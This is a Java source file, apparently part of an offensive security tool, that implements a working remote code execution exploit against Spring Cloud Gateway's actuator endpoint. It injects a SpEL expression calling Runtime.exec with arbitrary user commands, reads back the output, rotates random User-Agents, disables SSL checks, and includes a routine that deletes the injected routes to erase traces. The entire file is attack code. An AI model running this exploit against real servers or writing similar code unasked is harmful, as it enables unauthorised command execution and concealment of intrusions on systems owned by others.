package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class SpringGawRCE {
    public String address;
    public String command;
    public String pocData =
                    "{\n" +
                    "  \"id\": \"poctest\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(" +
                    "T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
    public String expData =
            "{\n" +
                    "  \"id\": \"expvul\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(" +
                    "T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
    public String[] processCommand(String command) {
        return command.split(" ");
    }
    public String constructExpData(String command) {
        String[] commandArray = processCommand(command);
        // 将参数数组转换为符合 Java 语法的字符串形式
        String commandString = Arrays.stream(commandArray)
                .map(arg -> "\\\"" + arg + "\\\"") // 确保每个参数都用引号括起来
                .collect(Collectors.joining(", "));
        // 构造最终的 expData 字符串
        return String.format(expData, commandString);
    }
    public SpringGawRCE(String address, String command) {
        this.address = address;
        this.command = command;
    }
    public SpringGawRCE(String address){
        this.address = address;
    }

    public void GawExp(ResultCallback callback) throws IOException{
        String api = "";
        String data = "";
        String res = "";
        String ua = "";
        String text = "";
        String refapi = "";
        disableSSLVerification();
        URL obj = new URL(address + "/actuator/env");
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        UA_Config uacf = new UA_Config();
        List<String> ualist = uacf.loadUserAgents();
        ua = uacf.getRandomUserAgent(ualist);
        conn.setRequestProperty("User-Agent",ua);
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            if (command == null) {
                api = "/actuator/gateway/routes/poctest";
                refapi = "/actuator/gateway/refresh";
                data = pocData;
            }else{
                api = "/actuator/gateway/routes/expvul";
                refapi = "/actuator/gateway/refresh";
                data = constructExpData(command);
            }
        }else {
            if (command == null) {
                api = "/gateway/routes/poctest";
                refapi = "/gateway/refresh";
                data = pocData;
            }else{
                api = "/gateway/routes/expvul";
                refapi = "/gateway/refresh";
                data = constructExpData(command);
            }
        }
        String site = address + api;
        try {
            URL obj1 = new URL(site);
            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn1.setRequestProperty("User-Agent",ua);
            conn1.setRequestMethod("POST");
            conn1.setRequestProperty("Content-Type", "application/json");
            conn1.setDoOutput(true);
            try (OutputStream os = conn1.getOutputStream()) {
                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            int responseCode1 = conn1.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_CREATED) {
                String site1 = address + refapi;
                URL obj2 = new URL(site1);
                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                conn2.setRequestProperty("User-Agent",ua);
                conn2.setRequestMethod("POST");
                conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn2.setDoOutput(true);
                int responseCode2 = conn2.getResponseCode();
                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    URL obj3 = new URL(site);
                    HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn3.setRequestProperty("User-Agent",ua);
                    conn3.setRequestMethod("GET");
                    conn3.setDoOutput(true);
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
                    String inputLine;
                    StringBuilder content = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        content.append(inputLine);
                        res = inputLine;
                    }
                    in.close();
                    int responseCode3 = conn3.getResponseCode();
                    if (responseCode3 == HttpURLConnection.HTTP_OK) {
                        if (!res.contains("poctest")) {
                            String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                            Pattern pattern = Pattern.compile(resultPattern);
                            Matcher matcher = pattern.matcher(content.toString());
                            if (matcher.find()) {
                                text = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
                                callback.onResult(text);
                            }
                        } else {
                            text = address + " " + "存在RCE漏洞!";
                            callback.onResult(text);
                        }
                    } else {
                        text = "POST request failed with response code: " + responseCode1;
                        callback.onResult(text);
                    }
                } else{
                    text = "POST request failed with response code: " + responseCode1;
                    callback.onResult(text);
                }
            }else{
                text = "无法创建gateway路由";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public void DelGaw(ResultCallback callback) throws IOException{
        String api = "";
        String api1 = "";
        String ua = "";
        String expapi = "";
        String text = "";
        String refapi = "";
        disableSSLVerification();
        URL obj = new URL(address + "/actuator/env");
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        UA_Config uacf = new UA_Config();
        List<String> ualist = uacf.loadUserAgents();
        ua = uacf.getRandomUserAgent(ualist);
        conn.setRequestProperty("User-Agent",ua);
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
                api = "/actuator/gateway/routes/poctest";
                refapi = "/actuator/gateway/refresh";
                api1 = "/actuator/gateway/routes/expvul";
                expapi = "/actuator/gateway/routes/pwnshell";
        }else {
            api = "/gateway/routes/poctest";
            refapi = "/gateway/refresh";
            api1 = "/gateway/routes/expvul";
            expapi = "/gateway/routes/pwnshell";
        }
        String site = address + api;
        String site1 = address + api1;
        String site2 = address + expapi;
        try {
            URL obj1 = new URL(site);
            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn1.setRequestProperty("User-Agent",ua);
            conn1.setRequestMethod("DELETE");
            conn1.setDoOutput(true);
            int responseCode1 = conn1.getResponseCode();
            URL obj2 = new URL(site1);
            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn2.setRequestProperty("User-Agent",ua);
            conn2.setRequestMethod("DELETE");
            conn2.setDoOutput(true);
            int responseCode2 = conn2.getResponseCode();
            URL obj3 = new URL(site2);
            HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn3.setRequestProperty("User-Agent",ua);
            conn3.setRequestMethod("DELETE");
            conn3.setDoOutput(true);
            int responseCode3 = conn3.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_OK || responseCode2 == HttpURLConnection.HTTP_OK || responseCode3 == HttpURLConnection.HTTP_OK) {
                String refsite = address + refapi;
                URL refobj = new URL(refsite);
                HttpURLConnection refconn = (HttpURLConnection) refobj.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                refconn.setRequestProperty("User-Agent",ua);
                refconn.setRequestMethod("POST");
                refconn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                refconn.setDoOutput(true);
                int refcode = refconn.getResponseCode();
                if (refcode == HttpURLConnection.HTTP_OK) {
                    text = "痕迹清除成功";
                    callback.onResult(text);
                } else{
                    text = "POST request failed with response code: " + responseCode1;
                    callback.onResult(text);
                }
            }else{
                text = "无法删除路由";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}

